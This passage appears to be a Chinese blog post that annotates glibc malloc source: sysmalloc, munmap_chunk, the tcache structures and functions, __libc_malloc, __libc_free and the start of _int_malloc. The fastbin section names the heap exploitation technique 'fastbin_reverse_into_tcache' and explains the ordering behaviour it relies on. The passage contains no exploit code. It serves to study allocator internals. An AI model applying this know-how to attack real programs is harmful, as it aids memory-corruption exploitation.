<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ----------- Routines dealing with system allocation -------------- */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc 处理从系统请求更多内存的 malloc 情况。</span></span><br><span class="line"><span class="comment">   进入时，假设 av-&gt;top 没有足够的空间来满足 nb 字节的请求，</span></span><br><span class="line"><span class="comment">   因此需要扩展或替换 av-&gt;top。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="type">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="type">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="type">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="type">bool</span> tried_mmap = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         如果支持 mmap，并且请求的大小符合 mmap 阈值，    128kb</span></span><br><span class="line"><span class="comment">         并且系统支持 mmap，并且当前分配的 mmap 区域数量足够少，</span></span><br><span class="line"><span class="comment">         那么尝试直接映射此请求，而不是扩展 top。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用mmap()系统调用直接向操作系统申请内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    try_mmap:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         将大小向上舍入到最近的页面。</span></span><br><span class="line"><span class="comment">         对于通过 mmap 获取的块，开销比普通块多一个 SIZE_SZ 单位，因为没有后续块的 prev_size 字段可以使用。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         请参见下面的 front_misalign 处理，对于 glibc，除非我们有高对齐需求，否则不需要进一步的对齐处理。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ, pagesize);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">      tried_mmap = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>由于 nb 为所需 chunk 的大小，在_int_malloc()函数中已经将用户需要分配的大小转化为 chunk 大小，当如果这个 chunk 直接使用 mmap()分配的话，该 chunk 不存在下一个相邻的 chunk，也就没有 prev_size 的内存空间可以复用，所以还需要额外 SIZE_SZ 大小的内存。由 于 mmap()分配的内存块必须页对齐。如果使用 mmap()分配内存，需要重新计算分配的内存 大小 size。</p>
<h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim()"></a>systrim()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   systrim 在某种程度上是 sysmalloc 的反向操作。</span></span><br><span class="line"><span class="comment">   它通过对 sbrk 传递负参数，将未使用的内存返还给系统（如果在 malloc 池的“高”端有未使用的内存）。</span></span><br><span class="line"><span class="comment">   当 top 空间超过修整阈值时，它会被 free() 自动调用。</span></span><br><span class="line"><span class="comment">   它也可以被公共的 malloc_trim 例程调用。如果实际释放了任何内存，则返回 1，否则返回 0。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="munmap"><a href="#munmap" class="headerlink" title="munmap()"></a>munmap()</h2><p><code>munmap_chunk</code> 函数用于<strong>释放</strong>通过内存映射分配的内存块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">munmap_chunk</span> <span class="params">(mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO (dl_pagesize); <span class="comment">// 获取系统页面大小</span></span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p); <span class="comment">// 获取当前块的大小</span></span><br><span class="line"></span><br><span class="line">  assert (chunk_is_mmapped (p)); <span class="comment">// 确保该块是一个内存映射块</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果该块是一个在转储主区域中的伪内存映射块，则不执行任何操作。</span></span><br><span class="line"><span class="comment">     我们从不释放这块内存。  */</span></span><br><span class="line">  <span class="keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>) chunk2mem (p); <span class="comment">// 获取块的内存地址</span></span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>) p - prev_size (p); <span class="comment">// 计算块的起始地址</span></span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size (p) + size; <span class="comment">// 计算总大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 不幸的是，我们必须手动完成编译器的工作。通常我们会分别测试</span></span><br><span class="line"><span class="comment">     BLOCK 和 TOTAL-SIZE 是否符合页面大小的要求。但 gcc 目前并不</span></span><br><span class="line"><span class="comment">     识别优化的可能性，因此我们在位测试之前将两个值合并为一个。 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span></span><br><span class="line">      || __glibc_unlikely (!powerof2 (mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;munmap_chunk(): 无效的指针&quot;</span>); <span class="comment">// 输出错误信息</span></span><br><span class="line"></span><br><span class="line">  atomic_decrement (&amp;mp_.n_mmaps); <span class="comment">// 减少内存映射块计数</span></span><br><span class="line">  <span class="type">atomic_add</span> (&amp;mp_.mmapped_mem, -total_size); <span class="comment">// 减少映射内存的总量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果 munmap 失败，进程的虚拟内存地址空间处于不良状态。</span></span><br><span class="line"><span class="comment">     只是让块悬挂在那里，进程很快就会终止，因为无能为力。 */</span></span><br><span class="line">  __munmap ((<span class="type">char</span> *) block, total_size); <span class="comment">// 尝试释放内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以后闲了再看吧，直接看tcache，malloc()和free()</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><p>在glibc2.29之后加入了key变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 每个线程都有一个这样的结构体，</span></span><br><span class="line"><span class="comment">   它包含每个线程的缓存（因此称为“tcache_perthread_struct”）。</span></span><br><span class="line"><span class="comment">   保持总体大小较小是稍微重要的。</span></span><br><span class="line"><span class="comment">   请注意，COUNTS 和 ENTRIES 是冗余的（我们本可以每次只计算链表的长度），但这是出于性能考虑。 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-puts"><a href="#tcache-puts" class="headerlink" title="tcache_puts()"></a>tcache_puts()</h3><p>将chunk放入tcache中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 调用者必须确保我们知道 tc_idx 是有效的，并且有足够的空间</span></span><br><span class="line"><span class="comment">   存放更多的块。 */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将这个块标记为“在 tcache 中”，以便在 _int_free 中测试</span></span><br><span class="line"><span class="comment">         可以检测到重复释放。 */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>从tcache中拿走chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 调用者必须确保 tc_idx 是有效的，并且有可移除的内存块。 */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-thread-shutdown"><a href="#tcache-thread-shutdown" class="headerlink" title="tcache_thread_shutdown()"></a>tcache_thread_shutdown()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init()"></a>tcache_init()</h3><p>这里重要的就是<code>_int_malloc (ar_ptr, bytes);</code>他分配了每次程序运行起来后哪个0x290的chunk，这个chunk里面就是本线程的tcache的所有信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56493e4e9000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56493e4e9290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56493e4e92b0</span><br><span class="line">Size: 0x20d50 (with flag bits: 0x20d51)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//*</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc()"></a>__libc_malloc()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);</span><br><span class="line"><span class="comment">//存在hook函数则执行hook函数</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//若tcache启用，首先使用tcache来分配chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;<span class="comment">//获取 nb+2*SIZE_SZ (0x10在64位中) 的大小，并判断</span></span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//tcache不满足的话，再用_int_malloc()，下面这些和单多线程有关</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure>

<h2 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"><span class="comment">//有hook函数调用hook函数</span></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* 查看动态的 brk/mmap 阈值是否需要调整。</span></span><br><span class="line"><span class="comment">		转储的虚假 mmap 块不会影响该阈值。 */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);<span class="comment">//这个就是前面那个munmap()释放通过内存映射(mmap)分配的内存块</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);<span class="comment">//调用_int_free()</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure>

<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h2><p>初始化声明变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="type">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     将请求大小转换为内部形式，通过添加 SIZE_SZ 字节的</span></span><br><span class="line"><span class="comment">     额外开销，并可能需要更多以获得必要的对齐，或</span></span><br><span class="line"><span class="comment">     至少获得 MINSIZE，即最小可分配大小。</span></span><br><span class="line"><span class="comment">     同时，checked_request2size 对于请求大小过大</span></span><br><span class="line"><span class="comment">     的情况返回 false，这样在填充和对齐后会</span></span><br><span class="line"><span class="comment">     发生零值回绕。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!checked_request2size (bytes, &amp;nb))</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (ENOMEM);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 没有可用的内存区域。回退到 sysmalloc 从 mmap 获取一个 chunk。 */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;				\</span><br></pre></td></tr></table></figure>

<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>在启用tcache的情况下，从fastbin中取出chunk:</p>
<ul>
<li>首先会在fastbin中找到所需的chunk</li>
<li>然后在tcachebin未满或这为空的情况下，会将它放入tcachebin中</li>
<li>即在tcache启用后优先从tcachebin中取出chunk给用户，所以这里就显示出了tcachebin的优先级比fastbin更高</li>
</ul>
<p>注意：</p>
<ul>
<li>因为tcache的单向链表用的头插法，头插法的特点就是如下：<ul>
<li>插入input: 10 20 30</li>
<li>遍历output：30 20 10</li>
</ul>
</li>
<li>所以这就导致了在同样size时，当tcachehbin中的chunk被取出后，若fastbin中有多个chunk，它们会逆序放入到tcachebin中</li>
</ul>
<p>攻击手法：fastbin_reverse_into_tcache</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果大小符合快速分配（fastbin）的条件，首先检查相应的空闲bin。</span></span><br><span class="line"><span class="comment">   这段代码即使在 av 尚未初始化的情况下也可以安全执行，因此</span></span><br><span class="line"><span class="comment">   可以在不检查的情况下尝试，这样可以节省在快速路径上的时间。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line"><span class="meta">  do							\</span></span><br><span class="line"><span class="meta">    &#123;							\</span></span><br><span class="line"><span class="meta">      victim = pp;					\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)				\</span></span><br><span class="line"><span class="meta">	break;						\</span></span><br><span class="line"><span class="meta">    &#125;							\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta">	 